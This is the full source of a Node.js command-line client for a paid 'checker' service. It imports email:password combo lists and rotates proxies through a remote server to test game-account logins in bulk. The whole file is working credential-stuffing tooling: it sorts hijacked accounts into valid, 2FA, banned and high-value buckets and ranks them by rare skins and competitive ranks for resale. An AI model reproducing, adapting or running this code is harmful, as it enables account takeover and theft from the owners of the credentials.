#!/usr/bin/env node
'use strict';
/*
 * R6Checker Desktop — website-login, HWID-locked bulk checker (CLI).
 * Files next to the exe: proxies.txt, accounts.txt → results.txt / valid.txt / vwi.txt
 */

const https = require('https');
const http  = require('http');
const fs    = require('fs');
const os    = require('os');
const path  = require('path');
const crypto = require('crypto');
const readline = require('readline');

let _sea = false; try { _sea = require('node:sea').isSea(); } catch {}
const BASE = (process.pkg || _sea) ? path.dirname(process.execPath) : process.cwd();
const here = (f) => path.join(BASE, f);
// "2026-06-09_14-30-15" — used to name a fresh output folder per run/sort.
function runStamp() {
  const d = new Date(), p = (n) => String(n).padStart(2, '0');
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())}_${p(d.getHours())}-${p(d.getMinutes())}-${p(d.getSeconds())}`;
}
const readFile  = (f) => { try { return fs.readFileSync(here(f), 'utf8'); } catch { return ''; } };
const writeFile = (f, s) => { try { fs.writeFileSync(here(f), s); return true; } catch { return false; } };

const DEFAULT_SERVER = 'https://r6checker.xyz';
const SERVER = (process.env.CHECKER_SERVER || readFile('server.txt').trim() || DEFAULT_SERVER).replace(/\/+$/, '');

try { process.stdin.resume(); } catch {}
function holdOpen() {
  try { if (process.platform === 'win32') { require('child_process').spawnSync('cmd', ['/c', 'pause'], { stdio: 'inherit' }); return; } } catch {}
  try { require('child_process').spawnSync('bash', ['-c', 'read -n1 -s -p "Press any key…"'], { stdio: 'inherit' }); } catch {}
}
function logErr(e) { try { fs.appendFileSync(here('crash.log'), `[${new Date().toISOString()}] ${e && e.stack ? e.stack : e}\n`); } catch {} }
process.on('uncaughtException', (e) => { logErr(e); try { console.log('\n  Fatal: ' + (e && e.message)); } catch {} holdOpen(); process.exit(1); });
process.on('unhandledRejection', (e) => { logErr(e); });

function computeHwid() {
  const nets = os.networkInterfaces(); let mac = '';
  for (const k of Object.keys(nets)) for (const n of (nets[k] || [])) if (!n.internal && n.mac && n.mac !== '00:00:00:00:00:00') { mac = n.mac; break; }
  return crypto.createHash('sha256').update([os.hostname(), os.platform(), os.arch(), (os.cpus()[0] || {}).model, mac, os.totalmem()].join('|')).digest('hex').slice(0, 32);
}
const HWID = computeHwid();

const c = (n, s) => `\x1b[${n}m${s}\x1b[0m`;
const blue = s => c('38;5;111', s), sky = s => c('38;5;75', s), green = s => c('38;5;42', s),
      red = s => c('38;5;203', s), mag = s => c('38;5;213', s), dim = s => c('38;5;240', s),
      bold = s => c('1', s), yellow = s => c('38;5;221', s), white = s => c('38;5;255', s),
      orange = s => c('38;5;208', s);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
function setTitle(t) { try { process.title = t; } catch {} try { process.stdout.write('\x1b]0;' + t + '\x07'); } catch {} }
function clear() { try { process.stdout.write('\x1b[2J\x1b[3J\x1b[H'); } catch {} }

const ART_LINES = Buffer.from('', 'base64').toString('utf8').split('\n');
const ART_SM = Buffer.from('', 'base64').toString('utf8').split(String.fromCharCode(10));
function splash() {
  clear();
  console.log();
  const cols = process.stdout.columns || 80;
  const vis = (s) => s.replace(/\x1b\[[0-9;]*m/g, '').length;
  const ctr = (s) => ' '.repeat(Math.max(0, Math.floor((cols - vis(s)) / 2))) + s;
  for (const l of ART_LINES) console.log(ctr(l));
  console.log();
  console.log(ctr(white(bold('R6CHECKER')) + dim('  ·  desktop bulk checker')));
  console.log(ctr(dim(`${SERVER}  ·  device ${HWID.slice(0, 8)}`)));
  console.log(ctr(dim('─'.repeat(46))));
  console.log();
}
function header() { // compact header for the live run screen
  clear();
  console.log();
  console.log('   ' + sky(bold('R6CHECKER')) + dim('  ·  desktop bulk checker'));
  console.log('   ' + dim('─'.repeat(46)));
  console.log();
}

function ask(q, { hidden = false } = {}) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout, terminal: true });
    if (hidden) rl._writeToOutput = (s) => { if (/[\r\n]/.test(s)) rl.output.write(s); else if (rl.line.length === 0) rl.output.write(s); else rl.output.write('•'); };
    rl.question(q, (a) => { rl.close(); resolve((a || '').trim()); });
  });
}

// ── HTTP ────────────────────────────────────────────────────────────────────
function request(method, urlPath, { key, body, stream } = {}) {
  return new Promise((resolve, reject) => {
    let u; try { u = new URL(SERVER + urlPath); } catch (e) { return reject(e); }
    const lib = u.protocol === 'http:' ? http : https;
    const data = body != null ? JSON.stringify(body) : null;
    const headers = { Accept: 'application/json', 'x-hwid': HWID };
    if (key) headers['x-api-key'] = key;
    if (data) { headers['Content-Type'] = 'application/json'; headers['Content-Length'] = Buffer.byteLength(data); }
    const r = lib.request(u, { method, headers, timeout: 120000 }, (res) => {
      if (stream) return resolve(res);
      let buf = ''; res.on('data', d => buf += d);
      res.on('end', () => { let j; try { j = JSON.parse(buf); } catch { j = buf; } resolve({ status: res.statusCode, body: j }); });
    });
    r.on('error', reject);
    r.on('timeout', () => r.destroy(new Error('request timed out')));
    if (data) r.write(data); r.end();
  });
}
function download(urlPath, key, destFile) {
  return new Promise((resolve, reject) => {
    request('GET', urlPath, { key, stream: true }).then((res) => {
      if (res.statusCode !== 200) { let b = ''; res.on('data', d => b += d); res.on('end', () => reject(new Error('HTTP ' + res.statusCode))); return; }
      const dest = here(destFile);
      try { fs.mkdirSync(path.dirname(dest), { recursive: true }); } catch {}
      const out = fs.createWriteStream(dest); let lines = 0;
      res.on('data', d => { lines += (d.toString().match(/\n/g) || []).length; });
      res.pipe(out); out.on('finish', () => resolve(lines)); out.on('error', reject);
    }).catch(reject);
  });
}

function accessLine(b) {
  if (b.owner) return '   ' + green('● OWNER') + dim('  ·  unlimited') + dim('   ·   ') + white(b.email);
  const exp = b.expiresAt ? new Date(b.expiresAt).toLocaleDateString() + ' ' + new Date(b.expiresAt).toLocaleTimeString() : 'unknown';
  return '   ' + green('● active') + dim('  until ') + green(exp) + dim('   ·   ') + white(b.email);
}

// ── auth (clears + repeats on error) ────────────────────────────────────────
async function authenticate() {
  const cached = readFile('key.txt').trim();
  if (cached) { try { const r = await request('GET', '/api/cli/me', { key: cached }); if (r.status === 200) return { key: cached, acct: r.body }; } catch {} }
  for (;;) {
    splash();
    console.log('   ' + bold('Sign in') + dim('  — your website account\n'));
    const email = await ask('   ' + dim('email     ') + sky('› '));
    if (!email) continue;
    const password = await ask('   ' + dim('password  ') + sky('› '), { hidden: true });
    process.stdout.write('\n   ' + dim('signing in… '));
    let r; try { r = await request('POST', '/api/cli/login', { body: { email, password } }); }
    catch (e) { r = { status: 0, body: { error: 'network: ' + e.message } }; }
    if (r.status === 200 && r.body.key) { writeFile('key.txt', r.body.key); return { key: r.body.key, acct: r.body }; }
    console.log(red('failed'));
    console.log('   ' + red((r.body && r.body.error) || ('HTTP ' + r.status)));
    if (r.status === 423) console.log('   ' + dim('Bound to another PC — ask support to reset your device.'));
    if (r.status === 402) console.log('   ' + dim('Buy/renew a pass at ' + SERVER + '/download'));
    await ask('\n   ' + dim('press Enter to try again…'));
  }
}

async function syncProxies(key, quiet) {
  const proxies = readFile('proxies.txt').split(/\r?\n/).map(s => s.trim()).filter(Boolean);
  if (!proxies.length) { if (!quiet) console.log('   ' + yellow('! proxies.txt is empty — add proxies, one per line.')); return 0; }
  const r = await request('POST', '/api/cli/proxies', { key, body: { proxies } });
  if (r.status !== 200) { console.log('   ' + red((r.body && r.body.error) || 'could not save proxies')); return 0; }
  if (!quiet) console.log('   ' + green('✓') + dim(' ' + r.body.count + ' proxies loaded'));
  return r.body.count;
}

function keyControl(onStop) {
  if (!process.stdin.isTTY) return () => {};
  // ask()'s readline closes leave stdin PAUSED — so keypress events stop firing
  // and 'S' was never seen. Re-enable raw mode AND resume the stream so the stop
  // key works every run. (q / Esc also stop.)
  try {
    readline.emitKeypressEvents(process.stdin);
    process.stdin.setRawMode(true);
    process.stdin.resume();
  } catch { return () => {}; }
  const h = (str, k) => {
    if (k && k.name === 'c' && k.ctrl) process.exit(0);
    const s = (str || '').toLowerCase();
    if (s === 's' || s === 'q' || (k && k.name === 'escape')) onStop();
  };
  process.stdin.on('keypress', h);
  return () => { process.stdin.removeListener('keypress', h); try { process.stdin.setRawMode(false); } catch {} };
}
// Per-account feed tag. Each account falls into exactly one bucket.
function label(s) {
  switch (s) {
    case 'vwi':     return mag(' VWI ');
    case 'twofa':   return yellow(' 2FA ');
    case 'banned':  return red(' BAN ');
    case 'valid':   return green('VALID');
    case 'invalid': return dim(' INV ');
    case 'retry':   return orange(' BLK ');
    case 'err':     return red(' ERR ');
    default:        return dim(' ··· ');
  }
}
function fmtEta(s) {
  if (!s || s < 0 || !isFinite(s)) return '—';
  if (s >= 3600) return Math.floor(s / 3600) + 'h' + Math.floor((s % 3600) / 60) + 'm';
  if (s >= 60)   return Math.floor(s / 60) + 'm' + (s % 60) + 's';
  return s + 's';
}
const g = (co, k) => co[k] || 0;
// Full window title — name | done/total | ETA | per-sec | every category.
function titleStr(co, done, total, cps, eta) {
  return `R6Checker  |  ${done.toLocaleString()}/${total.toLocaleString()}  |  ETA ${fmtEta(eta)}  |  ${cps}/s  |  ` +
    `V:${g(co,'valid')} VWI:${g(co,'vwi')} 2FA:${g(co,'twofa')} BAN:${g(co,'banned')} INV:${g(co,'invalid')} BLK:${g(co,'retry')} ERR:${g(co,'err')}`;
}
const visw = (s) => s.replace(/\x1b\[[0-9;]*m/g, '').length;

async function runJob(key, jobId, total) {
  clear();
  const seen = new Set();
  const feed = [];
  let done = 0, status = 'running', lastDone = 0, lastT = Date.now(), cps = 0, stop = false, stopping = false;
  const release = keyControl(() => { stop = true; stopping = true; });

  function paint(co, eta) {
    const cols = process.stdout.columns || 80;
    const rows = process.stdout.rows || 30;
    const ctr = (s) => ' '.repeat(Math.max(0, Math.floor((cols - visw(s)) / 2))) + s;
    // Show the compact art only if the window is tall enough to also fit the
    // dashboard + a few feed rows; otherwise fall back to a one-line header.
    const showArt = rows >= ART_SM.length + 18;
    const headH = showArt ? ART_SM.length + 4 : 2;
    const dashH = 8;
    const feedMax = Math.max(3, Math.min(16, rows - headH - dashH - 1));
    let out = '\x1b[H';                                   // home (anchored, no flicker)
    out += '\n';
    if (showArt) { for (const l of ART_SM) out += ctr(l) + '\n'; out += '\n'; }
    out += ctr(sky(bold('R6CHECKER')) + dim('  ·  checking')) + '\n\n';
    // progress bar
    const pct = total ? Math.min(100, Math.floor(done / total * 100)) : 0;
    const barW = 42, fill = Math.round(pct / 100 * barW);
    out += ctr(sky('█'.repeat(fill)) + dim('░'.repeat(barW - fill)) + '  ' + white(pct + '%')) + '\n';
    out += ctr(dim(`${done.toLocaleString()} / ${total.toLocaleString()}   ·   ${cps}/s   ·   ETA ${fmtEta(eta)}`)) + '\n\n';
    // counters
    out += ctr([
      green('V ' + g(co, 'valid')), mag('VWI ' + g(co, 'vwi')), yellow('2FA ' + g(co, 'twofa')),
      red('BAN ' + g(co, 'banned')), dim('INV ' + g(co, 'invalid')), orange('BLK ' + g(co, 'retry')), red('ERR ' + g(co, 'err')),
    ].join(dim('  ·  '))) + '\n\n';
    out += ctr(stopping ? yellow('■ stopping… finishing in-flight checks') : (dim('press ') + sky('S') + dim(' to stop'))) + '\n\n';
    // recent feed (newest last)
    for (const f of feed.slice(-feedMax)) out += '   ' + label(f.status) + '  ' + white(f.email) + '\n';
    out += '\x1b[J';                                      // clear anything below
    // Erase each line to its end (\x1b[K) BEFORE its newline so a shorter line
    // can never leave trailing characters from a longer previous frame — that
    // was the "long_email@domain.com" → "…commcom" phantom-tail artifact. The
    // data was always correct; only the on-screen overwrite was incomplete.
    process.stdout.write(out.replace(/\n/g, '\x1b[K\n'));
  }

  for (;;) {
    await sleep(400);
    if (stop) { await request('POST', `/api/cli/bulk/${jobId}/cancel`, { key }).catch(() => {}); stop = false; }
    let s; try { s = await request('GET', '/api/cli/bulk/' + jobId, { key }); } catch { continue; }
    if (s.status !== 200) continue;
    const b = s.body; done = b.done; status = b.status; const co = b.counts || {};
    for (const f of (b.feed || [])) { if (!f.email || seen.has(f.email)) continue; seen.add(f.email); feed.push(f); if (feed.length > 40) feed.shift(); }
    const now = Date.now(), dt = (now - lastT) / 1000;
    if (dt >= 0.3) { cps = Math.max(0, Math.round((done - lastDone) / dt)); lastDone = done; lastT = now; }
    const eta = cps > 0 ? Math.round((total - done) / cps) : 0;
    setTitle(titleStr(co, done, total, cps, eta));
    paint(co, eta);
    if (status !== 'running') break;
  }
  release();

  const co = (await request('GET', '/api/cli/bulk/' + jobId, { key }).catch(() => ({ body: {} }))).body.counts || {};
  // Every output goes into its own timestamped folder so runs never overwrite.
  const runDir = path.join('results', runStamp());
  try { fs.mkdirSync(here(runDir), { recursive: true }); } catch {}
  await download(`/api/cli/bulk/${jobId}/download?type=all`, key, path.join(runDir, 'results.txt')).catch(() => -1);
  await download(`/api/cli/bulk/${jobId}/download?type=valid`, key, path.join(runDir, 'valid.txt')).catch(() => 0);
  await download(`/api/cli/bulk/${jobId}/download?type=vwi`, key, path.join(runDir, 'vwi.txt')).catch(() => 0);
  const rel = './' + runDir.replace(/\\/g, '/') + '/';
  console.log();
  console.log('   ' + dim('─'.repeat(46)));
  console.log('   ' + (status === 'cancelled' ? yellow('■ stopped') : green('✓ done')) + dim('   ·   ') +
    green(g(co, 'valid') + ' valid') + dim(' · ') + mag(g(co, 'vwi') + ' VWI') + dim(' · ') + yellow(g(co, 'twofa') + ' 2FA') + dim(' · ') +
    red(g(co, 'banned') + ' ban') + dim(' · ') + dim(g(co, 'invalid') + ' inv') + dim(' · ') + orange(g(co, 'retry') + ' blk') + dim(' · ') + red(g(co, 'err') + ' err'));
  console.log('   ' + dim('saved → ') + sky(rel) + dim('  (results.txt · valid.txt · vwi.txt)'));
  console.log();
  // VWI hits found → offer to save them split by wanted item + rank.
  if (g(co, 'vwi') > 0) {
    const ans = await ask('   ' + mag('★ ' + g(co, 'vwi') + ' VWI hit' + (g(co, 'vwi') === 1 ? '' : 's') + ' found.') + dim('  save split by item/rank? ') + sky('(y/n) › '));
    if (/^y/i.test(ans)) { console.log(); saveVwiSplit(runDir); }
    console.log();
  }
  await ask('   ' + dim('press Enter for menu…'));
  return jobId;
}

// Save VWI hits into per-item and per-rank files under ./vwi/ (an account with
// several wanted items/ranks lands in each matching file). Source: vwi.txt.
// VWI buckets in PRIORITY order (high → low). Each account is filed under the
// SINGLE highest-priority bucket it qualifies for, so it never appears twice:
//   Glacier + Champion → Champion · Diamond + Emerald → Diamond · skins rank
//   above Emerald/Plat. Reorder this list to change the priority.
const VWI_PRIORITY = [
  'Champion', 'Diamond',
  'Glacier', 'Black Ice (20+)', 'R4-C Black Ice', 'SMG12 Black Ice', 'Gold Dust',
  'Obsidian', 'El Dorado', 'Crossfader', 'Chroma Streaks', 'Plasma Pink', 'Racer', 'Chupinazo',
  'VIP Invitational', 'Year One Pro League', 'Peacock', 'Fire', 'Dust Line',
  'Emerald', 'Plat',
];
// Every wanted bucket an account qualifies for (rank tiers + skin families).
function vwiBucketsOf(line) {
  const have = new Set();
  const rk = fieldOf(line, 'Ranks');
  if (rk && rk !== '—' && rk !== '-') for (const part of rk.split(',')) {
    const t = part.trim().replace(/\s*\(S?\d+\)\s*$/i, '').trim();
    if (t) have.add(t);
  }
  const sk = fieldOf(line, 'Skins');
  if (sk && sk !== '—' && sk !== '-') for (const part of sk.split(',')) {
    const m = part.trim().match(/^(\d+)\s*[x×]?\s*(.+)$/i);
    const name = (m ? m[2] : part).trim();
    if (name) have.add(name);
  }
  return have;
}
// Pick the single highest-priority bucket for an account.
function vwiBucketFor(line) {
  const have = vwiBucketsOf(line);
  return VWI_PRIORITY.find(b => have.has(b)) || [...have][0] || null;
}

function saveVwiSplit(runDir) {
  const vwiSrc = runDir ? here(path.join(runDir, 'vwi.txt')) : here('vwi.txt');
  let txt; try { txt = fs.readFileSync(vwiSrc, 'utf8'); } catch { console.log('   ' + red('vwi.txt not found.')); return; }
  const lines = txt.split(/\r?\n/).filter(l => l.trim());
  if (!lines.length) { console.log('   ' + dim('no VWI hits to save.')); return; }
  const dir = runDir ? here(path.join(runDir, 'vwi')) : here('vwi'); try { fs.mkdirSync(dir, { recursive: true }); } catch {}
  const groups = {};
  for (const l of lines) {
    const bucket = vwiBucketFor(l);
    if (bucket) (groups[bucket] = groups[bucket] || []).push(l);
  }
  const safe = (s) => s.replace(/[^a-z0-9]+/gi, '_').replace(/^_|_$/g, '');
  // Print in priority order so the most valuable buckets show first.
  const ents = Object.entries(groups).sort((a, c) => {
    const ia = VWI_PRIORITY.indexOf(a[0]), ic = VWI_PRIORITY.indexOf(c[0]);
    return (ia < 0 ? 99 : ia) - (ic < 0 ? 99 : ic);
  });
  for (const [name, arr] of ents) { try { fs.writeFileSync(path.join(dir, safe(name) + '.txt'), arr.join('\n') + '\n'); } catch {} }
  const relDir = './' + (runDir ? path.join(runDir, 'vwi') : 'vwi').replace(/\\/g, '/') + '/';
  console.log('   ' + green('✓ saved ' + lines.length.toLocaleString() + ' VWI hits → ' + ents.length + ' files (no account in two files) in ') + sky(relDir));
  for (const [name, arr] of ents) console.log('     ' + mag('•') + ' ' + white(name.padEnd(20)) + sky(String(arr.length)));
}

async function startCheck(key) {
  const accounts = readFile('accounts.txt').split(/\r?\n/).map(s => s.trim()).filter(Boolean);
  if (!accounts.length) { console.log('   ' + red('accounts.txt is empty (place it next to the exe).')); await ask('   ' + dim('press Enter…')); return null; }
  const r = await request('POST', '/api/cli/bulk/start', { key, body: { accounts: accounts.join('\n') } });
  if (r.status !== 200) { console.log('   ' + red((r.body && r.body.error) || ('HTTP ' + r.status))); await ask('   ' + dim('press Enter…')); return null; }
  return runJob(key, r.body.jobId, r.body.total);
}

// Import any email:pass file → merged into accounts.txt (deduped).
async function importAccounts() {
  const raw = await ask('   ' + dim('drag a file here or paste its path') + sky(' › '));
  const p = raw.replace(/^["']|["']$/g, '').trim();
  if (!p) return;
  let txt; try { txt = fs.readFileSync(p, 'utf8'); } catch (e) { console.log('   ' + red('could not read: ' + e.message)); return; }
  const lines = txt.split(/\r?\n/).map(s => s.trim()).filter(l => /^[^\s:]+:[^\s]/.test(l));
  if (!lines.length) { console.log('   ' + red('no email:password lines found in that file.')); return; }
  const existing = readFile('accounts.txt').split(/\r?\n/).map(s => s.trim()).filter(Boolean);
  const mode = (await ask('   ' + dim('found ' + lines.length.toLocaleString() + ' accounts · ') + sky('[M]') + dim('erge with ' + existing.length.toLocaleString() + ' existing or ') + sky('[R]') + dim('eplace? '))).trim().toLowerCase();
  if (mode === 'r' || mode === 'replace') {
    const fresh = Array.from(new Set(lines));
    writeFile('accounts.txt', fresh.join('\n') + '\n');
    console.log('   ' + green('✓') + dim(' replaced → accounts.txt (' + fresh.length.toLocaleString() + ' accounts)'));
  } else {
    const merged = Array.from(new Set([...existing, ...lines]));
    console.log('   ' + green('✓') + dim(' merged ' + lines.length.toLocaleString() + ' → accounts.txt (' + merged.length.toLocaleString() + ' total, ' + (existing.length + lines.length - merged.length).toLocaleString() + ' dupes removed)'));
    writeFile('accounts.txt', merged.join('\n') + '\n');
  }
}

// ── Local result classification (mirrors the website / server exactly) ──────
function fieldOf(line, lbl) { const m = line.match(new RegExp('\\|\\s*' + lbl + ':\\s*([^|]*)')); return m ? m[1].trim() : ''; }
const bannedY   = (l) => /\|\s*Banned:\s*Y\b/i.test(l);
const banUnkY   = (l) => /\|\s*Banned:\s*\?(?:\s|\||$)/i.test(l);
const linkableY = (l) => /XBX|PSN/i.test(fieldOf(l, 'Linkable'));
function isUsableValidL(l) {
  if (/\|\s*PARTIAL(\s|$)/.test(l)) return true;
  if (!l.includes(' | User: ')) return false;
  if (bannedY(l)) return false;          // exclude Banned: Y
  if (banUnkY(l)) return false;
  return linkableY(l);                   // exclude Linkable: —
}
function isVwiL(l) {
  if (!l.includes(' | User: ') || bannedY(l) || !linkableY(l)) return false;
  const has = (v) => v && v !== '—' && v !== '-';
  return has(fieldOf(l, 'Skins')) || has(fieldOf(l, 'Ranks'));
}
function classifyL(l) {
  if (/\|\s*ERROR_RETRY/.test(l)) return 'blocked';
  if (/\|\s*ERROR_(NETWORK|UNKNOWN)/.test(l)) return 'error';
  if (/\|\s*2FA_REQUIRED/.test(l)) return 'twofa';
  if (/\|\s*INVALID(\s|$)/.test(l)) return 'invalid';
  if (l.includes(' | User: ') || /\|\s*PARTIAL(\s|$)/.test(l)) {
    if (bannedY(l)) return 'banned';
    if (banUnkY(l)) return 'blocked';
    if (isVwiL(l)) return 'vwi';
    if (/\|\s*2FA:\s*Y\b/i.test(l)) return 'twofa';
    if (isUsableValidL(l)) return 'valid';
    return 'other';                      // valid login, no free console slot
  }
  return 'other';
}

// Sorter — split a results file into category files, just like the website's
// download buttons. Every line lands in exactly one bucket (counts sum to the
// line total → proof that nothing was skipped).
async function sortResults() {
  const def = fs.existsSync(here('results.txt')) ? 'results.txt' : '';
  const raw = await ask('   ' + dim('file to sort' + (def ? ' [' + def + ']' : '') + ' — drag/paste path') + sky(' › '));
  let p = (raw.replace(/^["']|["']$/g, '').trim()) || def;
  if (!p) { console.log('   ' + red('no file given.')); return; }
  if (!path.isAbsolute(p) && !fs.existsSync(p)) p = here(p);
  let txt; try { txt = fs.readFileSync(p, 'utf8'); } catch (e) { console.log('   ' + red('could not read: ' + e.message)); return; }
  const lines = txt.split(/\r?\n/).filter(l => l.trim());
  const b = { valid: [], vwi: [], twofa: [], banned: [], invalid: [], blocked: [], error: [], other: [] };
  // Tally every wanted skin family + rank tier across ALL login-successes.
  const skinTally = {}, rankTally = {};
  for (const l of lines) {
    const cat = classifyL(l);
    b[cat].push(l);
    if (cat === 'valid' || cat === 'vwi' || cat === 'twofa' || cat === 'banned') {
      // Skins field looks like "3× Glacier, 1× Obsidian" (or "—").
      const sk = fieldOf(l, 'Skins');
      if (sk && sk !== '—' && sk !== '-') for (const part of sk.split(',')) {
        const m = part.trim().match(/^(\d+)\s*[x×]?\s*(.+)$/i);
        if (m) skinTally[m[2].trim()] = (skinTally[m[2].trim()] || 0) + parseInt(m[1], 10);
        else if (part.trim()) skinTally[part.trim()] = (skinTally[part.trim()] || 0) + 1;
      }
      // Ranks field looks like "Plat (S41), Diamond (S37)" (or "—").
      const rk = fieldOf(l, 'Ranks');
      if (rk && rk !== '—' && rk !== '-') for (const part of rk.split(',')) {
        const tier = part.trim().replace(/\s*\(S?\d+\)\s*$/i, '').trim();
        if (tier) rankTally[tier] = (rankTally[tier] || 0) + 1;
      }
    }
  }
  const outDir = path.join('sorted', runStamp());
  try { fs.mkdirSync(here(outDir), { recursive: true }); } catch {}
  const files = { 'valid.txt': 'valid', 'vwi.txt': 'vwi', '2fa.txt': 'twofa', 'banned.txt': 'banned', 'invalid.txt': 'invalid', 'blocked.txt': 'blocked', 'errors.txt': 'error' };
  for (const [f, k] of Object.entries(files)) { try { fs.writeFileSync(here(path.join(outDir, f)), b[k].length ? b[k].join('\n') + '\n' : ''); } catch {} }
  console.log();
  console.log('   ' + green('✓ sorted ' + lines.length.toLocaleString() + ' lines') + dim('  → ') + sky('./' + outDir.replace(/\\/g, '/') + '/') + dim('  (none skipped)'));
  const row = (lbl, arr, col) => console.log('     ' + col(lbl.padEnd(9)) + white(arr.length.toLocaleString()));
  row('valid', b.valid, green); row('vwi', b.vwi, mag); row('2fa', b.twofa, yellow); row('banned', b.banned, red);
  row('invalid', b.invalid, dim); row('blocked', b.blocked, orange); row('error', b.error, red); row('unlinkable', b.other, dim);
  // Wanted ranks + ranked skins, sorted by count desc — "show everything".
  const dumpTally = (title, tally, col) => {
    const ents = Object.entries(tally).filter(([, n]) => n > 0).sort((a, c) => c[1] - a[1]);
    console.log();
    console.log('   ' + bold(col(title)) + dim(ents.length ? '' : '  none'));
    for (const [name, n] of ents) console.log('     ' + col('•') + ' ' + white(name.padEnd(20)) + sky(String(n)));
  };
  dumpTally('Wanted ranks', rankTally, yellow);
  dumpTally('Ranked skins', skinTally, mag);
  console.log();
  console.log('   ' + dim('saved → valid.txt · vwi.txt · 2fa.txt · banned.txt · invalid.txt · blocked.txt · errors.txt'));
}

async function menu(key, acct) {
  let last = null;
  for (;;) {
    splash();
    console.log(accessLine(acct));
    const px = await syncProxies(key, true);
    const accts = readFile('accounts.txt').split(/\r?\n/).filter(s => s.trim()).length;
    console.log('   ' + dim('accounts: ') + (accts ? white(accts.toLocaleString()) : red('0 — add accounts.txt')) +
                dim('   proxies: ') + (px ? green(px) : red('0 — add proxies.txt')));
    console.log();
    console.log('   ' + sky('1') + '   Start check        ' + dim('accounts.txt'));
    if (last) console.log('   ' + sky('2') + '   Resume remaining');
    console.log('   ' + sky('3') + '   Reload proxies');
    console.log('   ' + sky('4') + '   Import accounts    ' + dim('from any email:pass file'));
    console.log('   ' + sky('5') + '   Sort results       ' + dim('split into valid · vwi · 2fa · banned · invalid …'));
    console.log('   ' + sky('6') + '   Exit');
    const ch = await ask('\n   ' + dim('select ') + sky('› '));
    if (ch === '1') { const j = await startCheck(key); if (j) last = j; }
    else if (ch === '2' && last) {
      const r = await request('POST', `/api/cli/bulk/${last}/resume`, { key });
      if (r.status !== 200) { console.log('   ' + red((r.body && r.body.error) || ('HTTP ' + r.status))); await ask('   ' + dim('press Enter…')); }
      else last = await runJob(key, r.body.jobId, r.body.total);
    }
    else if (ch === '3') { await syncProxies(key); await ask('   ' + dim('press Enter…')); }
    else if (ch === '4') { await importAccounts(); await ask('   ' + dim('press Enter…')); }
    else if (ch === '5') { await sortResults(); await ask('   ' + dim('press Enter…')); }
    else if (ch === '6') { process.exit(0); }
  }
}

function ensureFiles() {
  for (const f of ['accounts.txt', 'proxies.txt']) { if (!fs.existsSync(here(f))) writeFile(f, ''); }
}

(async () => {
  setTitle('R6Checker  ·  desktop bulk checker');
  ensureFiles();
  try {
    const { key, acct } = await authenticate();
    await menu(key, acct);
  } catch (e) {
    logErr(e); try { console.log(red('\n  Error: ' + (e && e.message))); } catch {}
    holdOpen();
  }
  holdOpen();
  process.exit(0);
})();
